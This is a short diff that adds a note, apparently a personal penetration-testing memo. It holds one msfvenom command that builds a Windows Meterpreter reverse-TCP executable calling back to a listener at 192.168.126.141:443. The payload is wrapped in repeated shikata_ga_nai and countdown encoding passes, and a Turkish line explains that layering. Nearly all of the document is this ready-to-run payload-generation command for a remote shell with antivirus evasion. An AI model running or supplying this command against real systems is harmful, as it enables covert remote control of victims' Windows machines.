@@ -1,0 +1,3 @@
+“msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 20 -f exe -o /root/Desktop/eyup2.exe”
+
+multiple encoding => 10 iterasyonluk shikata_ga_nai üzerine 5 iterasyonluk coutdown ve onunda üzerine 20 iterasyonluk shikata_ga_nai yapıldı.
